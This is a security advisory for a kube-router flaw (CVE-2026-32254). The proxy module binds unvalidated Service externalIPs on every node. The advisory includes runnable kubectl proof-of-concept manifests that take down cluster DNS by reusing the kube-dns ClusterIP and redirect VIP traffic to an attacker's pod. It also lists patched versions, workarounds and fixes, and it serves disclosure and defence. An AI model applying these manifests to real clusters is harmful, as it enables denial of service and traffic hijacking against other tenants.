# [H] Kube-router Proxy Module Blindly Trusts ExternalIPs/LoadBalancer IPs Enabling Cluster-Wide Traffic Hijacking and DNS DoS

## Summary
Severity: High
Advisory: GHSA-phqm-jgc3-qf8g
CVE: CVE-2026-32254
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-phqm-jgc3-qf8g
Type: github-advisory

## Affected
- Go: `github.com/cloudnativelabs/kube-router/v2` — affected >=0 <2.8.0

## Details
# kube-router Proxy Module Does Not Validate ExternalIPs or LoadBalancer IPs Against Configured Ranges

## Summary

This issue primarily affects multi-tenant clusters where untrusted users are granted namespace-scoped permissions to create or modify Services. Single-tenant clusters or clusters where all Service creators are trusted are not meaningfully affected.

The kube-router proxy module's `buildServicesInfo()` function directly copies IPs from `Service.spec.externalIPs` and `status.loadBalancer.ingress` into node-level network configuration (kube-dummy-if interface, IPVS virtual services, LOCAL routing table) without validating them against the `--service-external-ip-range` parameter. A user with namespace-scoped Service CRUD permissions can bind arbitrary VIPs on all cluster nodes or cause denial of service to critical cluster services such as kube-dns.

The `--service-external-ip-range` parameter is only consumed by the netpol (network policy) module for firewall RETURN rules. The proxy module never reads this configuration, creating a gap between administrator expectations and actual enforcement.

Kubernetes' `DenyServiceExternalIPs` Feature Gate was introduced in v1.22 and remains disabled by default through v1.31, meaning most clusters allow Services to carry externalIPs without any admission control.

**Note:** This vulnerability class is not unique to kube-router. The upstream Kubernetes project classified the equivalent issue as [CVE-2020-8554](https://github.com/kubernetes/kubernetes/issues/97076) (CVSS 5.0/Medium), describing it as a design limitation with no planned in-tree fix. The reference service proxy (kube-proxy) and other third-party service proxy implementations exhibit the same behavior. kube-router's `--service-external-ip-range` parameter provides more defense-in-depth than most alternatives -- the gap is that this defense did not extend to the proxy module.

## Details

### Vulnerability Description

Kube-router's proxy module does not validate externalIPs or loadBalancer IPs before programming them into the node's network configuration:

1. **Unconditional externalIPs copy**: `buildServicesInfo()` directly `copy()`s `Service.spec.ExternalIPs` without any range validation
2. **Unconditional LoadBalancer IP trust**: The same function appends `status.loadBalancer.ingress[].ip` without verification
3. **`--service-external-ip-range` not checked by proxy**: This parameter is only referenced in the netpol module, the proxy module never checks it
4. **Cluster-wide impact**: IPs are bound to `kube-dummy-if` on all cluster nodes, added to IPVS, and added to the `kube-router-svip` ipset
5. **No conflict detection**: ExternalIPs that overlap with existing ClusterIPs (e.g., kube-dns `10.96.0.10`) cause the legitimate IPVS real servers to be fully replaced by the attacker's endpoints during the stale-endpoint cleanup cycle, redirecting all traffic for that VIP:port to attacker-controlled pods

### Vulnerable Code Locations

**File**: `pkg/controllers/proxy/network_services_controller.go`

**Lines 866, 898** - Unconditional externalIPs copy:
```go
externalIPs: make([]string, len(svc.Spec.ExternalIPs)),
copy(svcInfo.externalIPs, svc.Spec.ExternalIPs)  // No range check
```

**Lines 900-904** - Unconditional LoadBalancer IP trust:
```go
for _, lbIngress := range svc.Status.LoadBalancer.Ingress {
    if len(lbIngress.IP) > 0 {
        svcInfo.loadBalancerIPs = append(svcInfo.loadBalancerIPs, lbIngress.IP)
    }
}
```

**File**: `pkg/controllers/proxy/utils.go`

**Lines 425-461** - `getAllExternalIPs()` merges IPs without range validation:
```go
func getAllExternalIPs(svc *serviceInfo, includeLBIPs bool) map[v1.IPFamily][]net.IP {
    // Only performs IP parsing and deduplication, no range checking
}
```

**File**: `pkg/controllers/proxy/service_endpoints_sync.go`

**Lines 460-464** - Binds arbitrary IPs to kube-dummy-if via netlink:
```go
err = nsc.ln.ipAddrAdd(dummyVipInterface, externalIP.String(), nodeIP.String(), true)
```

**File**: `pkg/controllers/netpol/network_policy_controller.go`

**Lines 960-967** - `--service-external-ip-range` is ONLY referenced here:
```go
for _, externalIPRange := range config.ExternalIPCIDRs {
    _, ipnet, err := net.ParseCIDR(externalIPRange)
    npc.serviceExternalIPRanges = append(npc.serviceExternalIPRanges, *ipnet)
}
// The proxy module never references ExternalIPCIDRs
```

### Root Cause

The proxy module was implemented without externalIP range validation. The `--service-external-ip-range` parameter creates a gap between administrator expectations and actual enforcement: administrators may believe externalIPs are restricted to the configured range, but the proxy module (which actually configures IPVS and network interfaces) does not enforce this restriction.

This is consistent with the broader Kubernetes ecosystem. [CVE-2020-8554](https://github.com/kubernetes/kubernetes/issues/97076) documents the same fundamental issue: the Kubernetes API allows `Service.spec.externalIPs` to be set by any user with Service create/update permissions, and service proxies program these IPs into the data plane without validation. The upstream project's recommended mitigation is API-level admission control (e.g., `DenyServiceExternalIPs` feature gate, or admission webhooks).

## PoC

### Environment Setup

```bash
# Kind cluster: 1 control-plane + 1 worker
cat > kind-config.yaml <<EOF
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: kube-router-test
networking:
  disableDefaultCNI: true
  kubeProxyMode: "none"
nodes:
- role: control-plane
- role: worker
EOF

kind create cluster --config kind-config.yaml
kubectl apply -f https://raw.githubusercontent.com/cloudnativelabs/kube-router/v2.7.1/daemonset/kubeadm-kuberouter.yaml
kubectl -n kube-system wait --for=condition=ready pod -l k8s-app=kube-router --timeout=120s

# Create low-privileged attacker
kubectl create namespace attacker-ns
kubectl apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: cicd-developer
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: attacker-ns
  name: service-creator
rules:
- apiGroups: [""]
  resources: ["services"]
  verbs: ["get", "list", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: service-creator-binding
  namespace: attacker-ns
subjects:
- kind: ServiceAccount
  name: cicd-developer
  namespace: attacker-ns
roleRef:
  kind: Role
  name: service-creator
  apiGroup: rbac.authorization.k8s.io
EOF
```

### Exploitation

#### Scenario A: Arbitrary VIP Binding

```bash
kubectl --as=system:serviceaccount:attacker-ns:cicd-developer apply -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: malicious-externalip
  namespace: attacker-ns
spec:
  selector: { app: non-existent }
  ports: [{ port: 80, targetPort: 80 }]
  externalIPs: ["192.168.100.50", "10.200.0.1", "172.16.0.99"]
EOF
```

Result: All 3 IPs appear on kube-dummy-if, IPVS rules, and LOCAL routing table on ALL cluster nodes. No validation, no warning, no audit log.

#### Scenario B: Cluster DNS Takedown (Single Command)

```bash
kubectl --as=system:serviceaccount:attacker-ns:cicd-developer apply -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: dns-dos-svc
  namespace: attacker-ns
spec:
  selector: { app: non-existent-app }
  ports:
  - { name: dns-udp, port: 53, targetPort: 5353, protocol: UDP }
  - { name: dns-tcp, port: 53, targetPort: 5353, protocol: TCP }
  externalIPs: ["10.96.0.10"]
EOF
```

Before attack: kube-dns has 2 healthy real servers (CoreDNS pods).
After attack: The legitimate CoreDNS endpoints are fully evicted from the IPVS virtual service via the `activeServiceEndpointMap` overwrite and stale-endpoint cleanup cycle. If the attacker's Service has a selector pointing to attacker-controlled pods, those pods become the sole real servers for `10.96.0.10:53` -- receiving 100% of cluster DNS traffic. If no matching pods exist, the virtual service has zero real servers and DNS queries blackhole.
After deleting the attacker's Service: DNS immediately recovers.

#### Scenario C: `--service-external-ip-range` Bypass

With `--service-external-ip-range=10.200.0.0/16` configured, `192.168.100.50` (outside the range) is still bound. The proxy module never checks this parameter.

#### Scenario D: Arbitrary VIP Binding With Attacker Backend

A user can bind an arbitrary IP as a VIP on all cluster nodes. For previously unused IPs, this creates a new IPVS virtual service directing traffic to the attacker's pods. For IPs that match an existing ClusterIP on the same port, the attacker's endpoints replace the legitimate endpoints entirely (see Scenario B for the mechanism).

```bash
kubectl -n attacker-ns run attacker-backend --image=nginx:alpine --port=80
kubectl -n attacker-ns exec attacker-backend -- sh -c 'echo "HIJACKED-BY-ATTACKER" > /usr/share/nginx/html/index.html'
kubectl --as=system:serviceaccount:attacker-ns:cicd-developer apply -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: hijack-svc
  namespace: attacker-ns
spec:
  selector: { run: attacker-backend }
  ports: [{ port: 80, targetPort: 80 }]
  externalIPs: ["10.50.0.1"]
EOF
```

```
$ curl http://10.50.0.1/
HIJACKED-BY-ATTACKER
```

## Impact

**Confidentiality**: None - No direct data leakage

**Integrity**: Low - An attacker can bind arbitrary VIPs on cluster nodes and direct traffic to attacker-controlled pods. When an externalIP matches an existing ClusterIP on the same port, the legitimate endpoints are fully replaced by the attacker's endpoints via the IPVS stale-endpoint cleanup cycle -- the attacker receives 100% of that traffic. However, this is bounded to specific `(IP, protocol, port)` tuples that the attacker explicitly targets, is immediately visible via `kubectl get svc`, and constitutes traffic redirection rather than transparent interception. This is consistent with the upstream Kubernetes assessment of CVE-2020-8554 (I:Low).

**Availability**: High - A single command can take down cluster DNS, affecting all pods' name resolution, service discovery, and control plane communication

### Attack Scenarios

1. **Cluster-wide DNS DoS / traffic co-opt**: A user creates one Service with an externalIP matching the kube-dns ClusterIP on port 53. The legitimate CoreDNS endpoints are evicted and the attacker's pods receive all DNS queries cluster-wide.
2. **Arbitrary VIP binding**: A user binds unused IPs as VIPs on all cluster nodes, directing traffic to attacker-controlled pods
3. **ClusterIP conflict exploitation**: A user targets any existing ClusterIP:port combination to replace the legitimate service's endpoints with their own
4. **Security configuration bypass**: `--service-external-ip-range` is not enforced by the proxy module
5. **Trust boundary violation**: Namespace-scoped permissions affect all cluster nodes

## Affected Versions

- All kube-router v2.x versions (including latest v2.7.1)
- `buildServicesInfo()` has never referenced `ExternalIPCIDRs`

## Patched Versions

[v2.8.0](https://github.com/cloudnativelabs/kube-router/releases/tag/v2.8.0) and beyond

## Workarounds

1. **Enable DenyServiceExternalIPs Feature Gate**: Add `--feature-gates=DenyServiceExternalIPs=true` to the API server
2. **Deploy admission policy**: Use Kyverno/OPA/ValidatingAdmissionPolicy to restrict Services with externalIPs
3. **Restrict Service creation RBAC**: Tighten RBAC to prevent low-privileged users from creating Services
4. **Monitor Service changes**: Enable Kubernetes audit logging for Service create/update operations
5. **Apply BGP prefix filtering**: If kube-router is configured to advertise externalIPs or ClusterIPs via BGP, configure BGP peers (routers, firewalls) to only accept announcements for expected prefix ranges. This prevents a malicious externalIP from being advertised to and routed by the broader network.

## Mitigation

### Recommended Permanent Fix

1. **Proxy module should check `--service-external-ip-range`**: Validate externalIPs against configured ranges in `buildServicesInfo()`
2. **Default deny when unconfigured**: When `--service-external-ip-range` is not set, reject all externalIPs
3. **IP conflict detection**: Check externalIPs against existing ClusterIPs and NodeIPs
4. **Audit logging**: Log all externalIP configuration changes

## Credits

- @b0b0haha (Reporter)
- @j311yl0v3u (Reporter)

## References
- https://github.com/cloudnativelabs/kube-router/security/advisories/GHSA-phqm-jgc3-qf8g
- https://nvd.nist.gov/vuln/detail/CVE-2026-32254
- https://github.com/cloudnativelabs/kube-router/commit/a1f0b2eea3ee0f66b9a5b5c49dcb714619ccd456
- https://github.com/cloudnativelabs/kube-router
- https://github.com/cloudnativelabs/kube-router/releases/tag/v2.8.0
